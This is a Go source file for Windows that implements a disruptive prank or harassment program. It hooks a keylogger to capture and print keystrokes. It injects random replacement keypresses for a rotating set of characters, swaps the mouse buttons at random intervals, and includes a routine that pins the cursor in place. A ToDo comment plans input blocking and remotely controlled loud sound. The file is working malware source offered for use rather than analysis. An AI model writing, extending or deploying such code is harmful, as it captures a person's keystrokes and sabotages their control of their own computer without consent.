package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kindlyfire/go-keylogger"
	"github.com/micmonay/keybd_event"
)

/*
	ToDo:
	Move mouse cursor
	Block mouse cursor
	Block keyboard input
	Max volume with random sound/preprogrammed sound (maybe remotely controlled)
*/

type BOOL int32
type POINT struct {
	X, Y int32
}

const (
	delayKeyfetchMS = 5
	keyReplaceCount = 5
	keyReplaceChangeDelayS = 10
)

var (
	moduser32 = syscall.NewLazyDLL("user32.dll")

	procSwapMouseButton = moduser32.NewProc("SwapMouseButton")
	procSetCursorPos 	= moduser32.NewProc("SetCursorPos")
	procGetCursorPos 	= moduser32.NewProc("GetCursorPos")

	keysToReplace []string
	keysToReplacePTR *[]string = &keysToReplace
	mut *sync.Mutex
)

func main() {
	go changeKeysToReplace()
	go swapMouseButtons()
	replaceKeyboard()
}

func blockMouseCursor() {
	oldX, oldY, ok := getCursorPos()
	if ! ok {
		oldX, oldY, ok = getCursorPos()
		if ! ok {
			return
		}
	}

	for {
		time.Sleep(20 * time.Millisecond)
		newX, newY, ok := getCursorPos()
		if ! ok {
			continue
		}
		if newX != oldX || newY != oldY {
			setCursorPos(oldX, oldY)
		}
	}
}

func swapMouseButtons() {
	for {
		nBig, err := rand.Int(rand.Reader, big.NewInt(60))
		if err != nil {
			continue
		}
		swapMouseButton(true)
		time.Sleep(time.Duration(nBig.Int64()) * time.Second)
		swapMouseButton(false)

		nBig, err = rand.Int(rand.Reader, big.NewInt(60))
		if err != nil {
			continue
		}
		time.Sleep(time.Duration(nBig.Int64()) * time.Second)
	}
}

func replaceKeyboard() {
	kl := keylogger.NewKeylogger()
	keyruneString := ""
	kb, err := keybd_event.NewKeyBonding()
	if err != nil {
		return
	}

	for {
		key := kl.GetKey()

		if ! key.Empty {
			keyruneString = fmt.Sprintf("%c", key.Rune)
			fmt.Printf(keyruneString)

			if sliceStringContains(keyruneString, *keysToReplacePTR) {
				kb.SetKeys(keybd_event.VK_BACKSPACE, randomKeyReplace())
				err = kb.Launching()
				if err != nil {
					// Ignore
				}
			}
		}

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}

func changeKeysToReplace() {
	pKeys := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?![]{}-_.:,;()/|&%*#+"
	pKeySlice := strings.Split(pKeys, "")

	for {
		var keys []string

		for i := 0; i <= keyReplaceCount; i++ {
			nBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(pKeySlice) -1)))
			if err != nil {
				continue
			}
			keys = append(keys, pKeySlice[nBig.Int64()])
		}

		keysToReplacePTR = &keys

		time.Sleep(keyReplaceChangeDelayS * time.Second)
	}
}

func sliceStringContains(value string, slice []string) (bool) {
	for _, v := range slice {
		if v == value {
			return true
		}
	}
	return false
}

func randomKeyReplace() (keyBoardEvent int) {
	pKeys := [41]int{keybd_event.VK_A, keybd_event.VK_B, keybd_event.VK_C, keybd_event.VK_D, keybd_event.VK_E, keybd_event.VK_F, keybd_event.VK_G,
	keybd_event.VK_H, keybd_event.VK_I, keybd_event.VK_J, keybd_event.VK_K, keybd_event.VK_L, keybd_event.VK_M, keybd_event.VK_N, keybd_event.VK_O,
	keybd_event.VK_P, keybd_event.VK_Q, keybd_event.VK_R, keybd_event.VK_S, keybd_event.VK_T, keybd_event.VK_U, keybd_event.VK_V, keybd_event.VK_W,
	keybd_event.VK_X, keybd_event.VK_Y, keybd_event.VK_Z, keybd_event.VK_BACKSLASH, keybd_event.VK_RIGHTBRACE, keybd_event.VK_LEFTBRACE, keybd_event.VK_ENTER,
	keybd_event.VK_ESC, keybd_event.VK_0, keybd_event.VK_1, keybd_event.VK_2, keybd_event.VK_3, keybd_event.VK_4, keybd_event.VK_5, keybd_event.VK_6,
	keybd_event.VK_7, keybd_event.VK_8, keybd_event.VK_9}

	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(pKeys) -1)))
	if err != nil {
		keyBoardEvent = keybd_event.VK_ENTER
		return
	}
	keyBoardEvent = pKeys[nBig.Int64()]
	return
}

func boolToBOOL(value bool) BOOL {
	if value {
		return 1
	}

	return 0
}

func swapMouseButton(fSwap bool) bool {
	ret, _, _ := procSwapMouseButton.Call(
		uintptr(boolToBOOL(fSwap)))
	return ret != 0
}

func getCursorPos() (x, y int, ok bool) {
	pt := POINT{}
	ret, _, _ := procGetCursorPos.Call(uintptr(unsafe.Pointer(&pt)))
	return int(pt.X), int(pt.Y), ret != 0
}

func setCursorPos(x, y int) bool {
	ret, _, _ := procSetCursorPos.Call(
		uintptr(x),
		uintptr(y),
	)
	return ret != 0
}